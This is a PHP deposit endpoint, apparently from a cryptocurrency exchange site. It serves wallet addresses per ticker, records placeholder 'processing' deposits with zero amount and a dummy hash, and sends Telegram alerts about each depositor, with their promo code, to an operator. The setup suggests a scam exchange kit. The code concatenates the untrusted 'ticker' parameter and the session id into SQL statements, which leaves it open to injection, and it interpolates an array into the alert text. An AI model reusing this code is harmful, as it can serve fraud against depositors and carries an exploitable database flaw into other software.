<?php
error_reporting(0);
session_start();
include '_config.php';
date_default_timezone_set('UTC');
$current_time_ms = round(microtime(true) * 1000);
$time_trans = date("Y-m-d H:i:s", floor($current_time_ms / 1000));
$time_trans = strtotime($time_trans);
$ticker = $_GET['ticker'];

if ($stmt = $db->prepare('SELECT * FROM wallets WHERE id=1')) {
    $result = $stmt->execute();
    $arr = $result->fetchArray(SQLITE3_ASSOC);
}

$data = [
    'BTC' => ['BITCOIN' => $arr['btc'], 'BEP20' => $arr['btc_bep20']],
    'ETH' => ['ETHEREUM' => $arr['eth'], 'BEP20' => $arr['eth_bep20']],
    'LTC' => [null => $arr['ltc']],
    'BCH' => [null => $arr['btcc']],
    'BAT' => [null => $arr['bat']],
    'ETC' => [null => $arr['etc']],
    'USDT' => ['TRC20' => $arr['usdt_trc20'], 'BEP20' => $arr['usdt_bep20'], 'ERC20' => $arr['usdt_erc20']],
    'ZEC' => [null => $arr['zec']],
    'LINK' => [null => $arr['link']],
    'USDC' => ['TRC20' => $arr['usdc_trc20'], 'BEP20' => $arr['usdc_bep20'], 'ERC20' => $arr['usdc_erc20']],
    'BUSD' => ['BEP20' => $arr['busd_bep20'], 'ERC20' => $arr['busd_erc20']],
    'BNB' => ['BEP20' => $arr['bnb_bep20'], 'ERC20' => $arr['bnb_erc20']],
    'TRX' => [null => $arr['trx']]
];

if(isset($data[$ticker])){
    $addresses = [];
    foreach($data[$ticker] as $network => $address){
        $addresses[] = ['network' => $network, 'address' => $address];
    }
    echo json_encode(['success' => true, 'message' => '', 'data' => ['addresses' => $addresses]]);
}else{
    echo '{"success":false,"message":"ERROR 404"}';
}

if(!isset($USER_PROMO['promo'])){
    $USER_PROMO['promo'] = 'Не введен';
}


if ($stmt = $db->prepare('SELECT * FROM transfer WHERE uuid="'.$_SESSION['uuid'].'"')) {
    $result = $stmt->execute();
    while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
        $text_convert = $arr['text'];
    }
}

if($text_convert == ''){
    $convert_text = '{
   "type":"deposit",
   "amount":"0",
   "ticker":"'.$ticker.'",
   "hash":"1",
   "status":"processing",
   "created_time":'.$time_trans.'
}';
    $db->query("INSERT INTO transfer (text, uuid) VALUES ('$convert_text', '".$_SESSION['uuid']."')");
}else {
    $convert_text = '{
   "type":"deposit",
   "amount":"0",
   "ticker":"' . $ticker . '",
   "hash":"1",
   "status":"processing",
   "created_time":' . $time_trans . '
},'.$text_convert;
    $db->query("UPDATE transfer SET text = '" . $convert_text . "' WHERE uuid='" . $_SESSION['uuid'] . "';");
}

$message = "💰 [ДЕПОЗИТ]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}
Валюта: {$_GET['ticker']}

Кош. приема: {$addresses}

UUID: {$USER['uuid']}
";
sendTelegramMessage($chat_id, $message, $bot_token);
?>